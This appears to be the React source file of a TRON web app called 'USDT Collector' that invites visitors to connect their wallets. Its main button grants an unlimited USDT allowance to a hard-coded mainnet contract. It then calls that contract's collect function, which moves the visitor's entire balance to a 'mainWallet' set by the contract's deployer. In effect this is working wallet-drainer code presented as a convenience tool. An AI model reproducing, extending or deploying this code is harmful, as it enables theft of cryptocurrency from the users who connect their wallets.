// App.tsx
import { useState, useEffect, useCallback, useMemo } from 'react'
import { useWallet } from './WalletSetup'
import { WalletReadyState } from '@tronweb3/tronwallet-abstract-adapter'
import { Wallet, Copy, CheckCircle, AlertCircle, X } from 'lucide-react'

// ── CONFIG ──
const NETWORK = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'

const NETWORK_CONFIG = {
  Mainnet: { fullHost: 'https://api.trongrid.io', usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
  Nile:    { fullHost: 'https://nile.trongrid.io', usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf' },
}

const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── ABIs ──
const USDT_ABI = [
  { constant: true,  inputs: [{ name: "who", type: "address" }],
    name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" },
  { constant: true,
    inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }],
    name: "allowance", outputs: [{ name: "", type: "uint256" }], type: "function" },
  { constant: false,
    inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }],
    name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" },
];
const COLLECT_ABI = [
  { constant: true,  inputs: [], name: "mainWallet",
    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
  { constant: true,  inputs: [], name: "usdt",
    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
  { constant: false,
    inputs: [{ name: "user", type: "address" }, { name: "amount", type: "uint256" }],
    name: "collect", outputs: [], stateMutability: "nonpayable", type: "function" },
  { constant: true,  inputs: [], name: "owner",
    outputs: [{ name: "", type: "address" }], stateMutability: "view", type: "function" },
  { inputs: [{ name: "_usdt", type: "address" }, { name: "_mainWallet", type: "address" }],
    stateMutability: "nonpayable", type: "constructor" },
  { anonymous: false,
    inputs: [{ indexed: false, name: "from", type: "address" },
             { indexed: false, name: "amount", type: "uint256" }],
    name: "Collected", type: "event" },
];


// Wallet icons
const WALLET_ICONS: Record<string, string> = {
  TronLink: '🔵',
  'Trust Wallet': '🛡️',
  MetaMask: '🦊',
  'OKX Wallet': '⬛',
  WalletConnect: '🔗',
}

export default function App() {
  const {
    wallets,
    wallet,
    select,
    connect,
    disconnect,
    address: walletAddress,
    connected,
  } = useWallet()

  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [showPicker, setShowPicker] = useState(false)

  // ✅ FIXED: Stabilize tronWeb reference (this was causing the infinite loop)
  const tronWeb = useMemo(() => {
    return (wallet?.adapter as any)?.tronWeb ?? null
  }, [wallet?.adapter])

  const getBalance = useCallback(async (tw: any, addr: string) => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
    } catch (e) {
      console.warn('Balance fetch failed', e)
    }
  }, [])

  // ✅ FIXED: Only run when connection actually changes (no more loop)
  useEffect(() => {
    if (connected && walletAddress && tronWeb) {
      getBalance(tronWeb, walletAddress)
    }
  }, [connected, walletAddress, tronWeb, getBalance])

  const handlePickWallet = async (adapterName: string) => {
    setShowPicker(false)
    setStatus(`Connecting ${adapterName}…`)
    setLoading(true)
    try {
      select(adapterName as any)
      await new Promise(r => setTimeout(r, 150))
      await connect()
      setStatus('Connected ✅')
    } catch (err: any) {
      setStatus('❌ ' + (err.message ?? 'Connection failed'))
    } finally {
      setLoading(false)
    }
  }

  const handleDisconnect = async () => {
    await disconnect()
    setUsdtBalance('0')
    setStatus('Ready')
    setTxHash('')
  }

  const approveAndCollect = async () => {
    if (!tronWeb || !walletAddress) return
    setLoading(true)
    setStatus('Approving USDT…')
    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)
      await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 })

      setStatus('Waiting for confirmation…')
      await new Promise(r => setTimeout(r, 8000))

      const balRes = await (await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)).balanceOf(walletAddress).call()
      const amount = balRes.toString()

      if (!amount || amount === '0') {
        setStatus('No USDT to collect')
        return
      }

      const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS)
      const tx = await contract.collect(walletAddress, amount).send({ feeLimit: 150_000_000 })

      setTxHash(tx)
      setStatus('✅ All USDT collected!')
      await getBalance(tronWeb, walletAddress)
    } catch (err: any) {
      setStatus('❌ ' + (err.message ?? 'Transaction failed'))
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl border border-zinc-800 overflow-hidden">
        {/* Header */}
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">U</div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!connected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
              <p className="text-zinc-400 mb-10">Collect all USDT from your wallets to one main wallet</p>

              <button
                onClick={() => setShowPicker(true)}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                {loading ? 'Connecting…' : 'Connect Wallet'}
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">
                Trust Wallet • TronLink • MetaMask • OKX • 100+ via WalletConnect
              </p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                </div>
                <div className="flex items-center gap-2">
                  <button onClick={() => navigator.clipboard.writeText(walletAddress ?? '')} className="text-emerald-400 hover:text-white">
                    <Copy size={18} />
                  </button>
                  <button onClick={handleDisconnect} className="text-zinc-500 hover:text-red-400" title="Disconnect">
                    <X size={18} />
                  </button>
                </div>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">
                  {usdtBalance} <span className="text-3xl">USDT</span>
                </p>
              </div>

              <button
                onClick={approveAndCollect}
                disabled={loading}
                className="w-full bg-white hover:bg-zinc-100 text-black font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70"
              >
                {loading ? 'Processing…' : 'Collect All USDT'}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>
              {txHash && <p className="text-[10px] text-center text-emerald-400 break-all font-mono">TX: {txHash}</p>}
            </div>
          )}
        </div>
      </div>

      {/* Wallet Picker Modal */}
      {showPicker && (
        <div className="fixed inset-0 bg-black/90 z-[9999] flex items-center justify-center p-4">
          <div className="bg-zinc-900 rounded-3xl w-full max-w-sm overflow-hidden border border-zinc-700">
            <div className="px-6 py-4 border-b border-zinc-800 flex items-center justify-between">
              <h3 className="text-xl font-bold">Select Wallet</h3>
              <button onClick={() => setShowPicker(false)} className="text-zinc-400 hover:text-white">
                <X size={24} />
              </button>
            </div>

            <div className="max-h-[420px] overflow-y-auto p-2">
              {wallets.map(({ adapter }: any) => {
                const isInstalled = adapter.readyState === WalletReadyState.Found
                return (
                  <button
                    key={adapter.name}
                    onClick={() => handlePickWallet(adapter.name)}
                    className={`w-full flex items-center gap-4 px-4 py-4 rounded-2xl mb-2 text-left transition-all hover:bg-zinc-800 ${!isInstalled ? 'opacity-75' : ''}`}
                  >
                    <div className="w-11 h-11 bg-zinc-800 rounded-2xl flex items-center justify-center flex-shrink-0 overflow-hidden">
                      {adapter.icon ? (
                        <img src={adapter.icon} alt={adapter.name} className="w-9 h-9 object-contain" />
                      ) : (
                        <span className="text-3xl">{WALLET_ICONS[adapter.name] ?? '💼'}</span>
                      )}
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-lg">{adapter.name}</p>
                      <p className="text-sm text-zinc-400">
                        {adapter.name === 'WalletConnect' ? '100+ wallets via QR code' : isInstalled ? 'Ready to connect' : 'Not installed'}
                      </p>
                    </div>
                    {isInstalled && <span className="text-emerald-400 text-sm font-medium">Connect →</span>}
                  </button>
                )
              })}
            </div>

            <div className="px-6 py-5 border-t border-zinc-800 text-center text-xs text-zinc-500">
              Don't have a wallet?{' '}
              <a href="https://www.tronlink.org" target="_blank" rel="noreferrer" className="text-emerald-400 hover:underline">
                Get TronLink
              </a>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}